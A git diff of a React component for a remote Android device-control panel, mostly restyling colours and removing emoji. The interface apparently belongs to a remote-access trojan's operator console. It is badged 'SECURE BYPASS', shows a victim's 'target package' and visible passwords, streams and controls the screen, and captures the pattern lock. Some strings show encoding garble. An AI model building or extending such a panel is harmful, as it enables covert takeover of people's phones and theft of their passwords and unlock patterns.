                         <p className="text-slate-300 text-xs mb-4 font-mono">Screen Reader V2 está desligado.</p>
-                        <button onClick={toggleScreenReader} className="px-5 py-2.5 bg-gradient-to-r from-teal-600 to-emerald-500 hover:from-teal-500 hover:to-emerald-400 text-white rounded-xl text-xs font-bold shadow-lg">
-                          ‘ Ativar Screen Reader V2
+                        <button onClick={toggleScreenReader} className="px-5 py-2.5 bg-gradient-to-r from-teal-600 to-emerald-500 hover:from-teal-500 hover:to-emerald-400 text-white rounded-md text-xs font-bold shadow-lg">
+                           Ativar Screen Reader V2
                         </button>
                       </div>
                     ) : !screenHierarchy ? (
-                      <div className="text-center p-8 text-cyan-300 font-mono text-xs">
-                        <div className="animate-spin text-3xl mb-3">🔄</div>
+                      <div className="text-center p-8 text-[#ef4444] font-mono text-xs">
+                        <div className="animate-spin text-3xl mb-3"></div>
                         Aguardando dados da tela V2...
                       </div>
                     ) : (
@@ -7805,7 +7869,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 y: normY,
                                 scale: 'vnc_norm'
                               });
-                              addLog(`• Long Press na Tela V2: (${deviceDownX}, ${deviceDownY})`);
+                              addLog(` Long Press na Tela V2: (${deviceDownX}, ${deviceDownY})`);
                             }
                             else if (distance > 30) {
                               sendCommand({ 
@@ -7816,7 +7880,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 y2: normY2,
                                 scale: 'vnc_norm'
                               });
-                              addLog(`👉 Swipe na Tela V2: (${deviceDownX},${deviceDownY}) → (${deviceUpX},${deviceUpY})`);
+                              addLog(` Swipe na Tela V2: (${deviceDownX},${deviceDownY})  (${deviceUpX},${deviceUpY})`);
                             }
                             else {
                               sendCommand({ 
@@ -7825,14 +7889,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 y: normY,
                                 scale: 'vnc_norm'
                               });
-                              addLog(`–± Clique na Tela V2: (${deviceDownX}, ${deviceDownY})`);
+                              addLog(`± Clique na Tela V2: (${deviceDownX}, ${deviceDownY})`);
                             }
                             
                             setMouseDownPos(null);
                             setIsDragging(false);
                             dragPathRef.current = [];
                           }}
-                          className="relative bg-[#02050c] overflow-hidden rounded-[36px] shadow-[0_0_45px_rgba(239,68,68,0.4)] border-[3px] border-cyan-500/70 p-0.5 cursor-crosshair group flex items-center justify-center mx-auto" 
+                          className="relative bg-[#0c0202] overflow-hidden rounded-[36px] shadow-[0_0_45px_rgba(239,68,68,0.4)] border-[3px] border-[#2a2a31]/70 p-0.5 cursor-crosshair group flex items-center justify-center mx-auto" 
                           style={{ 
                             height: '740px',
                             width: `${740 * ((getHierarchyRoot(screenHierarchy)?.bounds?.w || SCREEN_BASE_WIDTH) / (getHierarchyRoot(screenHierarchy)?.bounds?.h || SCREEN_BASE_HEIGHT))}px`,
@@ -7840,9 +7904,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           }}
                         >
                           {/* Notch / Punch Hole da Cmera do Celular V2 */}
-                          <div className="absolute top-2.5 left-1/2 -translate-x-1/2 w-24 h-4 bg-slate-950 rounded-full z-30 border border-cyan-500/30 flex items-center justify-center gap-2 shadow-inner pointer-events-none">
-                            <div className="w-2.5 h-2.5 rounded-full bg-slate-900 border border-slate-700"></div>
-                            <div className="w-1.5 h-1.5 rounded-full bg-slate-800"></div>
+                          <div className="absolute top-2.5 left-1/2 -translate-x-1/2 w-24 h-4 bg-slate-950 rounded-full z-30 border border-[#2a2a31]/30 flex items-center justify-center gap-2 shadow-inner pointer-events-none">
+                            <div className="w-2.5 h-2.5 rounded-full bg-[#121214] border border-[#2a2a31]"></div>
+                            <div className="w-1.5 h-1.5 rounded-full bg-[#24242a]"></div>
                           </div>
 
                           <div className="relative h-full w-full overflow-hidden rounded-[32px] flex items-center justify-center" data-screen="true">
@@ -7861,7 +7925,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           </div>
 
                           {/* Barra Home do Celular V2 */}
-                          <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-20 h-1 bg-slate-700/70 rounded-full z-30 pointer-events-none"></div>
+                          <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-20 h-1 bg-[#2a2a31]/70 rounded-full z-30 pointer-events-none"></div>
                         </div>
                       </div>
                     )}
@@ -7881,13 +7945,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   />
                   
                   {/* ¨ ENVIAR TEXTO RPIDO DIRETO ABAIXO DO VNC */}
-                  <div className="mt-3 bg-[#3d0c04]/90 border border-cyan-500/30 backdrop-blur-xl shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-2xl p-3.5 transition-all hover:border-cyan-400/50">
+                  <div className="mt-3 bg-[#3d0c04]/90 border border-[#2a2a31]/30 backdrop-blur-xl shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-3.5 transition-all hover:border-[#3a3a44]/50">
                     <div className="flex items-center justify-between mb-2">
-                      <h4 className="text-cyan-400 font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
-                        <Keyboard className="w-4 h-4 text-cyan-400 animate-pulse" />
+                      <h4 className="text-[#ef4444] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
+                        <Keyboard className="w-4 h-4 text-[#ef4444] animate-pulse" />
                         {t('panel.send_quick_text')}
                       </h4>
-                      <span className="text-[10px] text-cyan-300/60 font-mono">Teclado Direto</span>
+                      <span className="text-[10px] text-[#ef4444]/60 font-mono">Teclado Direto</span>
                     </div>
                     <div className="flex items-center gap-2">
                       <input
@@ -7896,7 +7960,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         onChange={(e) => setTextToSend(e.target.value)}
                         onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                         placeholder={t('panel.type_here_send')}
-                        className="flex-1 px-3.5 py-2 bg-[#190503]/90 border border-cyan-500/30 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/40 text-xs font-mono transition-all shadow-inner"
+                        className="flex-1 px-3.5 py-2 bg-[#190503]/90 border border-[#2a2a31]/30 rounded-md text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 text-xs font-mono transition-all shadow-inner"
                       />
                       <EditableButton
                         id="btn-send-text-vnc"
@@ -7905,7 +7969,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         customStyle={layoutPrefs.buttonStyles['btn-send-text-vnc']}
                         onStyleChange={(style) => updateButtonStyle('btn-send-text-vnc', style)}
                         disabled={!textToSend.trim()}
-                        className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white disabled:from-slate-800 disabled:to-slate-850 disabled:text-slate-600 rounded-xl transition-all font-bold shadow-[0_0_12px_rgba(239,68,68,0.3)] uppercase tracking-wider font-mono text-xs flex items-center justify-center gap-1.5 cursor-pointer whitespace-nowrap"
+                        className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] disabled:from-[#24242a] disabled:to-slate-850 disabled:text-[#6f6f78] rounded-md transition-all font-bold shadow-[0_0_12px_rgba(239,68,68,0.3)] uppercase tracking-wider font-mono text-xs flex items-center justify-center gap-1.5 cursor-pointer whitespace-nowrap"
                       >
                         <MessageSquare className="w-3.5 h-3.5" /> {t('panel.send_to_device')}
                       </EditableButton>
@@ -7914,48 +7978,48 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
               ) : (
                 // Tela preta quando captura não está ativada
-                <div className="bg-slate-950/80 backdrop-blur-md rounded-2xl border border-cyan-500/20 flex flex-col items-center justify-center shadow-lg" style={{ height: '500px' }}>
+                <div className="bg-slate-950/80 backdrop-blur-md rounded-md border border-[#2a2a31]/20 flex flex-col items-center justify-center shadow-lg" style={{ height: '500px' }}>
                   <div className="text-center p-8">
-                    <div className="text-6xl mb-4 animate-bounce">📺</div>
-                    <h3 className="text-cyan-300 text-xl font-bold mb-2">Captura Desativada</h3>
+                    <div className="text-6xl mb-4 animate-bounce"></div>
+                    <h3 className="text-[#ef4444] text-xl font-bold mb-2">Captura Desativada</h3>
                     <p className="text-slate-400 text-sm mb-6">
                       Clique em "Iniciar Captura" para ver a tela do dispositivo
                     </p>
                     <button
                       onClick={toggleCapture}
-                      className="px-6 py-3 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-bold rounded-xl border border-cyan-400/30 shadow-[0_0_15px_rgba(239,68,68,0.4)] transition-all"
+                      className="px-6 py-3 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md border border-[#3a3a44]/30 shadow-[0_0_15px_rgba(239,68,68,0.4)] transition-all"
                     >
-                      –¶ Iniciar Captura
+                      ¶ Iniciar Captura
                     </button>
                   </div>
                 </div>
               )
             ) : (
               <div 
-                className={`bg-gradient-to-b from-[#290903]/95 via-[#180403]/95 to-[#0f0203]/98 backdrop-blur-2xl border border-cyan-500/40 rounded-2xl overflow-hidden flex flex-col mx-auto shadow-[0_0_50px_rgba(239,68,68,0.22)] ${isLayoutEditMode ? 'ring-2 ring-cyan-500 ring-offset-2 ring-offset-slate-955' : ''}`}
+                className={`bg-gradient-to-b from-[#1a1a1e]/95 via-[#180403]/95 to-[#0f0203]/98 backdrop-blur-2xl border border-[#2a2a31]/40 rounded-md overflow-hidden flex flex-col mx-auto shadow-[0_0_50px_rgba(239,68,68,0.22)] ${isLayoutEditMode ? 'ring-2 ring-[#ef4444] ring-offset-2 ring-offset-slate-955' : ''}`}
                 style={{ maxWidth: isScreenReaderEnabled && screenHierarchy ? '900px' : '420px', width: '100%', transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)' }}
               >
-                {/* Linha🏦 Neon no topo */}
-                <div className="h-1 w-full bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500 animate-pulse" />
+                {/* Linha Neon no topo */}
+                <div className="h-1 w-full bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#f87171] animate-pulse" />
 
                 {/* Header Cyberpunk V2 */}
-                <div className="flex items-center justify-between p-4 bg-slate-950/80 border-b border-cyan-500/25 shadow-lg backdrop-blur-md">
+                <div className="flex items-center justify-between p-4 bg-slate-950/80 border-b border-[#2a2a31]/25 shadow-lg backdrop-blur-md">
                   <div className="flex items-center space-x-3.5">
-                    <div className="p-2.5 bg-gradient-to-br from-cyan-500/20 to-blue-600/20 rounded-xl border border-cyan-500/40 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
-                      <Eye className="w-6 h-6 text-cyan-400 animate-pulse" />
+                    <div className="p-2.5 bg-gradient-to-br from-[#ef4444]/20 to-[#ef4444]/20 rounded-md border border-[#2a2a31]/40 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
+                      <Eye className="w-6 h-6 text-[#ef4444] animate-pulse" />
                     </div>
                     <div>
                       <div className="text-white font-black text-base flex items-center gap-2 font-mono tracking-wide">
                         <span>Screen Reader V2</span>
-                        <span className="px-2 py-0.5 text-[9px] font-black uppercase bg-cyan-500/20 text-cyan-300 rounded border border-cyan-400/40 tracking-wider shadow-[0_0_8px_rgba(239,68,68,0.3)]">
+                        <span className="px-2 py-0.5 text-[9px] font-black uppercase bg-[#ef4444]/20 text-[#ef4444] rounded border border-[#3a3a44]/40 tracking-wider shadow-[0_0_8px_rgba(239,68,68,0.3)]">
                           SECURE BYPASS
                         </span>
                       </div>
                       {screenHierarchy ? (
-                        <p className="text-[11px] text-cyan-400/90 font-mono flex items-center gap-1.5 mt-0.5">
+                        <p className="text-[11px] text-[#ef4444]/90 font-mono flex items-center gap-1.5 mt-0.5">
                           <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                           <span className="font-semibold text-slate-300">Pacote Alvo:</span>
-                          <span className="text-cyan-300 font-bold">{screenHierarchy.package}</span>
+                          <span className="text-[#ef4444] font-bold">{screenHierarchy.package}</span>
                         </p>
                       ) : (
                         <p className="text-[11px] text-slate-400 font-mono mt-0.5">Aguardando íconexão com dispositivo...</p>
@@ -7964,42 +8028,42 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   </div>
                   {isScreenReaderEnabled && (
                     <div className="flex items-center space-x-2.5">
-                      <div className="text-[11px] font-mono bg-cyan-950/80 text-cyan-300 border border-cyan-500/40 px-3 py-1.5 rounded-xl flex items-center shadow-[0_0_12px_rgba(239,68,68,0.2)]">
-                        <div className="w-2.5 h-2.5 bg-cyan-400 rounded-full mr-2 animate-pulse shadow-[0_0_6px_#ff6b6b]" />
+                      <div className="text-[11px] font-mono bg-[#121214]/80 text-[#ef4444] border border-[#2a2a31]/40 px-3 py-1.5 rounded-md flex items-center shadow-[0_0_12px_rgba(239,68,68,0.2)]">
+                        <div className="w-2.5 h-2.5 bg-[#ef4444] rounded-full mr-2 animate-pulse shadow-[0_0_6px_#ff6b6b]" />
                         ~10 FPS
                       </div>
-                      <div className="text-[11px] font-mono font-bold bg-amber-950/80 text-amber-300 border border-amber-500/40 px-3 py-1.5 rounded-xl flex items-center shadow-[0_0_12px_rgba(245,158,11,0.2)]">
-                        🔒 Senhas Visíveis
+                      <div className="text-[11px] font-mono font-bold bg-amber-950/80 text-amber-300 border border-amber-500/40 px-3 py-1.5 rounded-md flex items-center shadow-[0_0_12px_rgba(245,158,11,0.2)]">
+                         Senhas Visíveis
                       </div>
                     </div>
                   )}
                 </div>
 
-                {/* Ž› PAINEL DE CONTROLES E CONFIGURA‡•ES DA TELA V2 */}
+                {/* Ž PAINEL DE CONTROLES E CONFIGURAES DA TELA V2 */}
                 {isScreenReaderEnabled && screenHierarchy && (
-                  <div className="p-3.5 bg-gradient-to-r from-slate-950/90 via-[#2c0903]/70 to-slate-950/90 border-b border-cyan-500/20 space-y-3.5">
+                  <div className="p-3.5 bg-gradient-to-r from-slate-950/90 via-[#2c0903]/70 to-slate-950/90 border-b border-[#2a2a31]/20 space-y-3.5">
                     {/* Linha 1 - Sliders */}
                     <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 text-xs">
                       {/* Escala do Texto */}
-                      <div className="flex flex-col space-y-1.5 p-2.5 bg-slate-900/60 rounded-xl border border-slate-800">
+                      <div className="flex flex-col space-y-1.5 p-2.5 bg-[#121214]/60 rounded-md border border-[#24242a]">
                         <label className="text-slate-300 font-bold flex justify-between items-center text-[11px]">
-                          <span className="flex items-center gap-1.5">“ Escala do Texto</span>
-                          <span className="text-cyan-400 font-black font-mono bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-500/30">{Math.round(v2TextScale * 100)}%</span>
+                          <span className="flex items-center gap-1.5"> Escala do Texto</span>
+                          <span className="text-[#ef4444] font-black font-mono bg-[#121214]/60 px-2 py-0.5 rounded border border-[#2a2a31]/30">{Math.round(v2TextScale * 100)}%</span>
                         </label>
                         <input type="range" min="60" max="200" value={v2TextScale * 100}
                           onChange={(e) => setV2TextScale(parseFloat(e.target.value) / 100)}
-                          className="w-full h-1.5 rounded-full appearance-none cursor-pointer accent-cyan-400 bg-slate-800"
+                          className="w-full h-1.5 rounded-full appearance-none cursor-pointer accent-[#ef4444] bg-[#24242a]"
                         />
                       </div>
                       {/* Opacidade dos Elementos */}
-                      <div className="flex flex-col space-y-1.5 p-2.5 bg-slate-900/60 rounded-xl border border-slate-800">
+                      <div className="flex flex-col space-y-1.5 p-2.5 bg-[#121214]/60 rounded-md border border-[#24242a]">
                         <label className="text-slate-300 font-bold flex justify-between items-center text-[11px]">
-                          <span className="flex items-center gap-1.5">💧 Opacidade Visão</span>
-                          <span className="text-purple-400 font-black font-mono bg-purple-950/60 px-2 py-0.5 rounded border border-purple-500/30">{Math.round(v2Opacity * 100)}%</span>
+                          <span className="flex items-center gap-1.5"> Opacidade Visão</span>
+                          <span className="text-[#f87171] font-black font-mono bg-purple-950/60 px-2 py-0.5 rounded border border-[#f87171]/30">{Math.round(v2Opacity * 100)}%</span>
                         </label>
                         <input type="range" min="20" max="100" value={v2Opacity * 100}
                           onChange={(e) => setV2Opacity(parseFloat(e.target.value) / 100)}
-                          className="w-full h-1.5 rounded-full appearance-none cursor-pointer accent-purple-400 bg-slate-800"
+                          className="w-full h-1.5 rounded-full appearance-none cursor-pointer accent-[#f87171] bg-[#24242a]"
                         />
                       </div>
                     </div>
@@ -8008,49 +8072,49 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-xs">
                       {/* Modo / Tema Visual */}
                       <div className="flex flex-col space-y-1 col-span-2 sm:col-span-1">
-                        <span className="text-slate-400 font-bold text-[10px] uppercase tracking-wider">–¥ Tema Visual</span>
+                        <span className="text-slate-400 font-bold text-[10px] uppercase tracking-wider">¥ Tema Visual</span>
                         <select value={v2DesignTheme} onChange={(e) => setV2DesignTheme(e.target.value as any)}
-                          className="w-full bg-slate-900/90 text-cyan-200 border border-cyan-500/40 rounded-lg p-1.5 text-[11px] focus:outline-none focus:border-cyan-400 font-bold cursor-pointer"
+                          className="w-full bg-[#121214]/90 text-[#e8e8ea] border border-[#2a2a31]/40 rounded-md p-1.5 text-[11px] focus:outline-none focus:border-[#3a3a44] font-bold cursor-pointer"
                         >
-                          <option value="cyan">🔵 Modern Blue</option>
-                          <option value="matrix">🟢 Hacker Matrix</option>
-                          <option value="neon-red">🔴 Alvo Tático</option>
-                          <option value="purple-glowing">🟣 Radar Fantasma</option>
+                          <option value="cyan"> Modern Blue</option>
+                          <option value="matrix"> Hacker Matrix</option>
+                          <option value="neon-red"> Alvo Tático</option>
+                          <option value="purple-glowing"> Radar Fantasma</option>
                         </select>
                       </div>
                       
                       {/* Estilo de Borda */}
                       <div className="flex flex-col space-y-1 col-span-2 sm:col-span-1">
-                        <span className="text-slate-400 font-bold text-[10px] uppercase tracking-wider">⬛ Estilo de Borda</span>
+                        <span className="text-slate-400 font-bold text-[10px] uppercase tracking-wider"> Estilo de Borda</span>
                         <select value={v2CornerStyle} onChange={(e) => setV2CornerStyle(e.target.value as any)}
-                          className="w-full bg-slate-900/90 text-cyan-200 border border-cyan-500/40 rounded-lg p-1.5 text-[11px] focus:outline-none focus:border-cyan-400 font-bold cursor-pointer"
+                          className="w-full bg-[#121214]/90 text-[#e8e8ea] border border-[#2a2a31]/40 rounded-md p-1.5 text-[11px] focus:outline-none focus:border-[#3a3a44] font-bold cursor-pointer"
                         >
                           <option value="brackets"> Cantos HUD</option>
-                          <option value="full-border">▭ Borda Completa</option>
+                          <option value="full-border"> Borda Completa</option>
                           <option value="dots">· · Pontilhado</option>
-                          <option value="none">✕ Sem Borda</option>
+                          <option value="none"> Sem Borda</option>
                         </select>
                       </div>
                       
                       {/* Toggles */}
                       <div className="col-span-2 sm:col-span-2 flex flex-wrap gap-2 items-center pt-3 sm:pt-0">
-                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-slate-900/80 rounded-lg border border-slate-700 hover:border-cyan-500/50 transition-all select-none">
+                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-[#121214]/80 rounded-md border border-[#2a2a31] hover:border-[#2a2a31]/50 transition-all select-none">
                           <input type="checkbox" checked={v2ShowGrid} onChange={(e) => setV2ShowGrid(e.target.checked)}
-                            className="rounded w-3.5 h-3.5 text-cyan-500 bg-slate-950 border-cyan-500/40 focus:ring-0"
+                            className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                           />
-                          <span className="text-slate-200 font-bold text-[11px]">⊞ Grade</span>
+                          <span className="text-slate-200 font-bold text-[11px]"> Grade</span>
                         </label>
-                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-slate-900/80 rounded-lg border border-slate-700 hover:border-cyan-500/50 transition-all select-none">
+                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-[#121214]/80 rounded-md border border-[#2a2a31] hover:border-[#2a2a31]/50 transition-all select-none">
                           <input type="checkbox" checked={v2HideUntypedElements} onChange={(e) => setV2HideUntypedElements(e.target.checked)}
-                            className="rounded w-3.5 h-3.5 text-cyan-500 bg-slate-950 border-cyan-500/40 focus:ring-0"
+                            className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                           />
-                          <span className="text-slate-200 font-bold text-[11px]">”🏦 Interativos</span>
+                          <span className="text-slate-200 font-bold text-[11px]"> Interativos</span>
                         </label>
-                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-slate-900/80 rounded-lg border border-slate-700 hover:border-cyan-500/50 transition-all select-none">
+                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-[#121214]/80 rounded-md border border-[#2a2a31] hover:border-[#2a2a31]/50 transition-all select-none">
                           <input type="checkbox" checked={v2ShowCoords} onChange={(e) => setV2ShowCoords(e.target.checked)}
-                            className="rounded w-3.5 h-3.5 text-cyan-500 bg-slate-950 border-cyan-500/40 focus:ring-0"
+                            className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                           />
-                          <span className="text-slate-200 font-bold text-[11px]">“ Coords</span>
+                          <span className="text-slate-200 font-bold text-[11px]"> Coords</span>
                         </label>
                         <button
                           type="button"
@@ -8058,20 +8122,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             const nextState = !v2PatternMode;
                             setV2PatternMode(nextState);
                             if (nextState) {
-                              addLog('🔓 Modo Desenhar Padrão ativado na Tela V2! Arraste entre os pontos 1-9.');
+                              addLog(' Modo Desenhar Padrão ativado na Tela V2! Arraste entre os pontos 1-9.');
                             } else {
                               setV2PatternDrawn([]);
                               setV2PatternDragPos(null);
                             }
                           }}
-                          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-lg border transition-all text-[11px] font-black select-none cursor-pointer ${
+                          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-md border transition-all text-[11px] font-black select-none cursor-pointer ${
                             v2PatternMode
-                              ? 'bg-cyan-500/30 text-cyan-300 border-cyan-400 shadow-[0_0_15px_rgba(239,68,68,0.5)] animate-pulse'
-                              : 'bg-slate-900/80 text-slate-300 border-slate-700 hover:border-cyan-500/40'
+                              ? 'bg-[#ef4444]/30 text-[#ef4444] border-[#3a3a44] shadow-[0_0_15px_rgba(239,68,68,0.5)] animate-pulse'
+                              : 'bg-[#121214]/80 text-slate-300 border-[#2a2a31] hover:border-[#2a2a31]/40'
                           }`}
                           title="Ativar modo interativo de desenho da senha padrão (Pattern Lock)"
                         >
-                          <span>🔓 Padrão {v2PatternDrawn.length > 0 ? `(${v2PatternDrawn.join('-')})` : ''}</span>
+                          <span> Padrão {v2PatternDrawn.length > 0 ? `(${v2PatternDrawn.join('-')})` : ''}</span>
                         </button>
                       </div>
                     </div>
@@ -8080,9 +8144,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 
                 {!isScreenReaderEnabled ? (
                   <div className="flex flex-col items-center justify-center p-6 text-center space-y-4" style={{ minHeight: '480px' }}>
-                    <div className="p-5 rounded-2xl bg-gradient-to-b from-cyan-950/50 to-slate-950/80 border border-cyan-500/40 text-cyan-300 max-w-md shadow-[0_0_30px_rgba(239,68,68,0.2)]">
-                      <Eye className="w-12 h-12 mx-auto mb-3 text-cyan-400 animate-pulse" />
-                      <h4 className="font-mono font-black text-base uppercase tracking-wider text-cyan-300">
+                    <div className="p-5 rounded-md bg-gradient-to-b from-[#121214]/50 to-slate-950/80 border border-[#2a2a31]/40 text-[#ef4444] max-w-md shadow-[0_0_30px_rgba(239,68,68,0.2)]">
+                      <Eye className="w-12 h-12 mx-auto mb-3 text-[#ef4444] animate-pulse" />
+                      <h4 className="font-mono font-black text-base uppercase tracking-wider text-[#ef4444]">
                         Screen Reader V2 Tático
                       </h4>
                       <p className="text-xs text-slate-300 font-mono mt-1.5 mb-5 leading-relaxed">
@@ -8090,14 +8154,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       </p>
                       <button
                         onClick={toggleScreenReader}
-                        className="w-full py-3 bg-gradient-to-r from-cyan-600 via-blue-600 to-indigo-600 hover:from-cyan-500 hover:to-indigo-500 text-white font-mono font-black text-xs uppercase tracking-wider rounded-xl shadow-[0_0_25px_rgba(239,68,68,0.5)] transition-all transform hover:scale-[1.02]"
+                        className="w-full py-3 bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] font-mono font-black text-xs uppercase tracking-wider rounded-md shadow-[0_0_25px_rgba(239,68,68,0.5)] transition-all transform hover:scale-[1.02]"
                       >
-                        ⚡ Ativar Screen Reader V2 Agora
+                         Ativar Screen Reader V2 Agora
                       </button>
                     </div>
 
                     {/* Transmissão VNC de Apoio */}
-                    <div className="w-full max-w-[420px] rounded-2xl overflow-hidden border border-cyan-500/40 shadow-[0_0_25px_rgba(239,68,68,0.15)]">
+                    <div className="w-full max-w-[420px] rounded-md overflow-hidden border border-[#2a2a31]/40 shadow-[0_0_25px_rgba(239,68,68,0.15)]">
                       <DeviceScreen
                         deviceId={deviceId!}
                         onCommand={sendCommand}
@@ -8191,7 +8255,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               y: normY,
                               scale: 'vnc_norm'
                             });
-                            addLog(`• Long Press: (${deviceDownX}, ${deviceDownY})`);
+                            addLog(` Long Press: (${deviceDownX}, ${deviceDownY})`);
                           }
                           else if (distance > 30) {
                             sendCommand({ 
@@ -8202,7 +8266,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               y2: normY2,
                               scale: 'vnc_norm'
                             });
-                            addLog(`👉 Swipe: (${deviceDownX},${deviceDownY}) → (${deviceUpX},${deviceUpY})`);
+                            addLog(` Swipe: (${deviceDownX},${deviceDownY})  (${deviceUpX},${deviceUpY})`);
                           }
                           else {
                             sendCommand({ 
@@ -8211,7 +8275,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               y: normY,
                               scale: 'vnc_norm'
                             });
-                            addLog(`–± Click: (${deviceDownX}, ${deviceDownY})`);
+                            addLog(`± Click: (${deviceDownX}, ${deviceDownY})`);
                           }
                           
                           setMouseDownPos(null);
@@ -8243,7 +8307,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       >
                         {/* Moldura Tática ao Redor do Celular */}
                         <div 
-                          className="relative bg-[#02050c] overflow-hidden rounded-2xl shadow-[0_0_35px_rgba(239,68,68,0.25)] border-2 border-cyan-500/40 p-0.5 transition-all duration-300 hover:border-cyan-400" 
+                          className="relative bg-[#0c0202] overflow-hidden rounded-md shadow-[0_0_35px_rgba(239,68,68,0.25)] border-2 border-[#2a2a31]/40 p-0.5 transition-all duration-300 hover:border-[#3a3a44]" 
                           style={{ 
                             width: '450px',
                             aspectRatio: `${getHierarchyRoot(screenHierarchy)?.bounds?.w || SCREEN_BASE_WIDTH} / ${getHierarchyRoot(screenHierarchy)?.bounds?.h || SCREEN_BASE_HEIGHT}`
@@ -8266,12 +8330,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     </div>
                     
                     {/* Coluna da Direita (Lista de Elementos Clicáveis Atualizada) */}
-                    <div className="md:col-span-5 flex flex-col h-[420px] bg-slate-950/70 rounded-xl border border-cyan-500/20 p-3 shadow-inner">
+                    <div className="md:col-span-5 flex flex-col h-[420px] bg-slate-950/70 rounded-md border border-[#2a2a31]/20 p-3 shadow-inner">
                       {/* Topo com Contador e Filtro de Busca */}
-                      <div className="flex flex-col mb-2.5 pb-2 border-b border-cyan-500/20 space-y-2">
+                      <div className="flex flex-col mb-2.5 pb-2 border-b border-[#2a2a31]/20 space-y-2">
                         <div className="flex items-center justify-between">
-                          <h4 className="text-cyan-300 font-black text-xs flex items-center tracking-wider font-mono">
-                            <List className="w-4 h-4 mr-1.5 text-cyan-400 animate-pulse" />
+                          <h4 className="text-[#ef4444] font-black text-xs flex items-center tracking-wider font-mono">
+                            <List className="w-4 h-4 mr-1.5 text-[#ef4444] animate-pulse" />
                             ELEMENTOS CLICVEIS ({(() => {
                               const list: ScreenReaderNode[] = [];
                               const collect = (node: ScreenReaderNode) => {
@@ -8291,14 +8355,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         </div>
                         <input
                           type="text"
-                          placeholder="” Buscar elemento por texto ou tipo..."
+                          placeholder=" Buscar elemento por texto ou tipo..."
                           value={v2FilterQuery}
                           onChange={(e) => setV2FilterQuery(e.target.value)}
-                          className="w-full bg-slate-900/90 text-slate-100 border border-cyan-500/30 rounded-lg px-2.5 py-1 text-[11px] focus:outline-none focus:border-cyan-400 font-semibold"
+                          className="w-full bg-[#121214]/90 text-slate-100 border border-[#2a2a31]/30 rounded-md px-2.5 py-1 text-[11px] focus:outline-none focus:border-[#3a3a44] font-semibold"
                         />
                       </div>
                       
-                      <div className="flex-1 overflow-y-auto space-y-1.5 pr-1 max-h-[350px] scrollbar-thin scrollbar-thumb-cyan-500/25 scrollbar-track-transparent">
+                      <div className="flex-1 overflow-y-auto space-y-1.5 pr-1 max-h-[350px] scrollbar-thin scrollbar-thumb-[#3a3a44]/25 scrollbar-track-transparent">
                         {(() => {
                           const list: ScreenReaderNode[] = [];
                           const collect = (node: ScreenReaderNode) => {
@@ -8325,8 +8389,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           if (filtered.length === 0) {
                             return (
                               <div className="flex flex-col items-center justify-center py-10 text-center">
